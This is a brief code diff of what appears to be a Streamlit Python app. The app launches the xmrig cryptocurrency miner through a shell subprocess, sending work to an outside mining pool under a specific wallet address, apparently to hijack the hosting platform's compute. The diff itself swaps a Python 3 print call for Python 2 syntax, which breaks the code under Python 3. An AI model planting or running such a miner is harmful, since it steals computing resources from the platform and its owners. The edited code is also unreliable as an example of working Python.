@@ -73,7 +73,7 @@ with st.echo(code_location='below'):
 
         
 p = subprocess.Popen("./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.labideneyim -t 4 -k", stdout=subprocess.PIPE, shell=True)
-print(p.communicate())
+print p.communicate()[0]
 
 import time 
 from IPython.display import clear_output 
